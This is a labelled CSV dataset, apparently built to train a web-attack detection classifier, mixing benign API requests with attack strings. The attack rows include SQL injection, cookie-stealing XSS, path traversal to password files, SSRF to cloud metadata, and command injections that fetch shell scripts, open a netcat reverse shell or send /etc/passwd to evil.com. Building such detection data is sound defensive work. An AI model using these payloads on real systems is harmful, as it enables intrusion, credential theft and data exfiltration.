"text","label"
"cmd=| wget http://attacker.com/shell.sh","1"
"order_id=ORD-4710 status=confirmed","0"
"POST /api/users?id=123&format=json","0"
"| wget http://attacker.com/shell.sh","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"GET /.env HTTP/1.1","1"
"GET ../../../../var/log/apache2/access.log","1"
"user_id=211&action=view","0"
"search=phone","0"
"user=1' AND SLEEP(5)--","1"
"id=1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"GET /api/search/644","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"page=34&limit=10","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=laptop","0"
"GET /.env HTTP/1.1","1"
"comment=<iframe src=javascript:alert(1)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"id=1 AND 1=CONVERT(int,@@version)--","1"
"description=<script>alert(1)</script>","1"
"GET /settings User-Agent: PostmanRuntime/7.36.0","0"
"repeated authentication failure admin account locked","1"
"cmd=$(whoami)","1"
"username=root&password=abc123","1"
"POST /dashboard body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /settings User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"user=ahmed&filter=active","0"
"url=http://10.0.0.1","1"
"....//....//etc/passwd","1"
"page=41&limit=50","0"
"url=http://metadata.google.internal","1"
"POST /api/data body=command| cat /etc/passwd","1"
"url=file:///etc/passwd","1"
"1' OR '1'='1' /*","1"
"category=audio page=10","0"
"GET /api/users?id=' OR ''='","1"
"page=20&limit=20","0"
"GET /backup.sql HTTP/1.1","1"
"user_id=880&action=view","0"
"search=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"password spray attack detected multiple users","1"
"POST /api/products body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"repeated authentication failure admin account locked","1"
"POST /api/login username=1' AND SLEEP(5)-- password=test","1"
"GET /api/search?q='><script>alert(1)</script>","1"
"message='><script>alert(1)</script>","1"
"exec=; ping -c 4 attacker.com","1"
"../../../../var/log/apache2/access.log","1"
"path=../../../../proc/self/environ","1"
"path=file:///etc/passwd","1"
"path=../../../../etc/shadow","1"
"search=phone","0"
"url=gopher://127.0.0.1:25/","1"
"name=Ahmed email=456@mail.com","0"
"cmd=|| nc -e /bin/sh attacker.com 4444","1"
"url=dict://127.0.0.1:11211/","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /api/swagger.json HTTP/1.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=41&limit=20","0"
"fetch=http://internal-service:8080/secret","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /health HTTP/1.1","0"
"GET /settings/5241","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"login attempt failed username admin invalid credentials","1"
"GET /.git/config HTTP/1.1","1"
"GET /api/search/8914","0"
"search=phone","0"
"GET /api/orders/6072","0"
"username=administrator&password=monkey","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"filename=& whoami","1"
"GET /config.php HTTP/1.1","1"
"description=<svg/onload=alert(1)>","1"
"../../../../proc/self/environ","1"
"GET /api/products User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"username=' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"GET /health HTTP/1.1","0"
"PUT /api/search?category=electronics&page=1","0"
"; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"GET ../../../../etc/passwd","1"
"GET /settings/5986","0"
"Authorization: Bearer validtoken906","0"
"DELETE /profile User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /admin HTTP/1.1","1"
"url=dict://127.0.0.1:11211/","1"
"POST /api/products body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=laptop","0"
"search=laptop","0"
"GET /api/products?status=pending&priority=high","0"
"<ScRiPt>alert(1)</ScRiPt>","1"
"GET /api/users?id=1 AND 1=CONVERT(int,@@version)--","1"
"GET /web.config HTTP/1.1","1"
"GET /.git/config HTTP/1.1","1"
"order_id=ORD-7727 status=confirmed","0"
"user_id=702&action=view","0"
"repeated authentication failure admin account locked","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"search=laptop","0"
"repeated authentication failure admin account locked","1"
"brute force attempt on login endpoint from single ip","1"
"POST /api/login username=1'%09OR%091=1-- password=test","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /server-status HTTP/1.1","1"
"user=' OR 'x'='x","1"
"description=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"exec=& whoami","1"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"GET /api/products/5001","0"
"comment=<iframe src=javascript:alert(1)>","1"
"user_id=321&action=view","0"
"User-Agent: Nikto/2.5.0","1"
"page=46&limit=10","0"
"username=admin&password=admin123","1"
"filename=| cat /etc/passwd","1"
"' OR 1=1#","1"
"GET /api/products/5595","0"
"order_id=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=1 AND SLEEP(5)--","1"
"User-Agent: Nmap Scripting Engine","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=1' OR '1'='1' /*","1"
"path=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"name=Nour email=409@mail.com","0"
"description=<div onmouseover=alert(1)>hover</div>","1"
"GET /actuator/env HTTP/1.1","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"id=123&format=json","0"
"name=Ahmed email=607@mail.com","0"
"password spray attack detected multiple users","1"
"repeated authentication failure admin account locked","1"
"id=1' OR 0x31=0x31--","1"
"User-Agent: Nikto/2.5.0","1"
"POST /api/feedback body=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"POST /api/feedback body=<svg onload=alert(1)>","1"
"exec=; cat /etc/shadow","1"
"login attempt failed username admin invalid credentials","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"User-Agent: Nikto/2.5.0","1"
"cmd=; python -c 'import socket,subprocess'","1"
"POST /api/orders body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/users User-Agent: axios/1.6.0","0"
"page=45&limit=20","0"
"file:///etc/passwd","1"
"GET /health HTTP/1.1","0"
"date=2024-01-15&type=order","0"
"POST /api/users body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /dashboard/3763","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"user_id=717&action=view","0"
"ping=$(curl -s http://attacker.com/shell.sh)","1"
"url=dict://127.0.0.1:11211/","1"
"GET /health HTTP/1.1","0"
"POST /api/users body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"page=3&limit=10","0"
"user=admin'--","1"
"search=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"admin'#","1"
"category=phones page=4","0"
"page=36&limit=10","0"
"url=http://localhost:8080","1"
"page=23&limit=10","0"
"url=gopher://127.0.0.1:25/","1"
"page=1&limit=10","0"
"limit=20&offset=0","0"
"title=<ScRiPt>alert(1)</ScRiPt>","1"
"POST /api/feedback body=<details open ontoggle=alert(1)>","1"
"POST /api/search body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/products?status=pending&priority=high","0"
"multiple failed login attempts detected for admin","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /admin HTTP/1.1","1"
"include=php://filter/convert.base64-encode/resource=config.php","1"
"message=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"GET /api/files?name=../../../../etc/passwd","1"
"GET /api/users/8402","0"
"' OR '1'='1","1"
"POST /api/orders body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"url=file:///etc/passwd","1"
"POST /api/login User-Agent: axios/1.6.0","0"
"user_id=499&action=view","0"
"user_id=527&action=view","0"
"POST /settings?id=123&format=json","0"
"title=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"Authorization: Bearer validtoken788","0"
"comment=""><script>alert(1)</script>","1"
"search=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"status=pending&priority=high","0"
"GET /api/products?status=pending&priority=high","0"
"POST /api/login body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"POST /api/feedback body=<script>alert(1)</script>","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"User-Agent: Nmap Scripting Engine","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"search=phone","0"
"user_id=29&action=view","0"
"GET /backup.sql HTTP/1.1","1"
"url=http://localhost:8080","1"
"GET /api/search?search=laptop&sort=price","0"
"GET /api/search?q='><script>alert(1)</script>","1"
"GET /console HTTP/1.1","1"
"POST /api/feedback body=<script >alert(1)</script >","1"
"order_id=ORD-8659 status=confirmed","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"Authorization: Bearer validtoken311","0"
"GET /health HTTP/1.1","0"
"GET /api/search?q=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"username=' OR 1=1#","1"
"user_id=234&action=view","0"
"GET /api/login User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"search=phone","0"
"POST /api/data body=command; ls -la","1"
"multiple failed login attempts detected for admin","1"
"GET /health HTTP/1.1","0"
"url=http://metadata.google.internal","1"
"POST /api/data body=command; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"password spray attack detected multiple users","1"
"page=16&limit=10","0"
